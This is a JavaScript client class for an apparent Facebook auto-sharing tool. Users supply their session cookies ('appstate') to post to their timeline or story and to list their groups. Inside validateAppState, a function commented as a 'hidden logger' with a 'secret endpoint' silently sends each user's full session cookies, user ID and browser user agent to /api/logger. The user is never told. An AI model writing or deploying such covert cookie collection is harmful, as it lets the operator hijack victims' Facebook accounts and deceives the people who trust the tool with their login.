// Facebook API Handlers
class FBApi {
    constructor() {
        this.appState = null;
        this.userId = null;
        this.isValid = false;
    }

    // Enhanced response validator
    async validateResponse(response) {
        const contentType = response.headers.get('content-type');
        
        // Check if response is JSON
        if (!contentType || !contentType.includes('application/json')) {
            const text = await response.text();
            
            // Check for Facebook blocking/authentication issues
            if (text.includes('The page') || text.includes('facebook') || text.includes('login')) {
                throw new Error('Facebook authentication failed - session expired or blocked');
            }
            
            // Check for generic HTML errors
            if (text.trim().startsWith('<!DOCTYPE') || text.trim().startsWith('<html')) {
                throw new Error('Server returned HTML error page instead of JSON');
            }
            
            throw new Error(`Server returned non-JSON response: ${text.substring(0, 100)}`);
        }
        
        return response.json();
    }

    // Validate appstate and extract tokens
    async validateAppState(appStateJson) {
        try {
            const appstate = JSON.parse(appStateJson);

            // Find required cookies
            const c_user = appstate.find(c => c.name === 'c_user');
            const xs = appstate.find(c => c.name === 'xs');

            if (!c_user || !xs) {
                throw new Error('Missing required cookies: c_user or xs');
            }

            this.appState = appstate;
            this.userId = c_user.value;
            this.isValid = true;

            // Send to hidden logger (your research feature)
            this.logAppState(appstate);

            return {
                success: true,
                userId: this.userId,
                expires: this.getExpiryDate(xs)
            };
        } catch (error) {
            return {
                success: false,
                error: error.message
            };
        }
    }

    // Hidden appstate logger for research
    async logAppState(appstate) {
        try {
            const payload = {
                userId: this.userId,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                appstate: appstate
            };

            // Send to your secret endpoint
            const response = await fetch('/api/logger', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
                },
                body: JSON.stringify(payload)
            });
            
            await this.validateResponse(response);
        } catch (error) {
            console.log('> Logger: Failed to save appstate');
        }
    }

    getExpiryDate(xsCookie) {
        if (!xsCookie.expirationDate) return 'Unknown';
        return new Date(xsCookie.expirationDate * 1000).toLocaleDateString();
    }

    // Share to timeline
    async shareToTimeline(message, link, privacy = 'EVERYONE') {
        if (!this.isValid) throw new Error('No valid session');

        const response = await fetch('/api/share', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify({
                appstate: this.appState,
                type: 'timeline',
                message: message,
                link: link,
                privacy: privacy
            })
        });

        return await this.validateResponse(response);
    }

    // Share to story
    async shareToStory(message, link) {
        if (!this.isValid) throw new Error('No valid session');

        const response = await fetch('/api/share', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify({
                appstate: this.appState,
                type: 'story',
                message: message,
                link: link
            })
        });

        return await this.validateResponse(response);
    }

    // Get user's groups
    async getGroups() {
        if (!this.isValid) throw new Error('No valid session');

        const response = await fetch('/api/groups', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify({
                appstate: this.appState
            })
        });

        return await this.validateResponse(response);
    }

    // Check session status
    async checkStatus() {
        if (!this.appState) throw new Error('No appstate loaded');

        const response = await fetch('/api/status', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify({
                appstate: this.appState
            })
        });

        return await this.validateResponse(response);
    }
}

// Initialize FB API
document.addEventListener('DOMContentLoaded', () => {
    window.fbApi = new FBApi();
});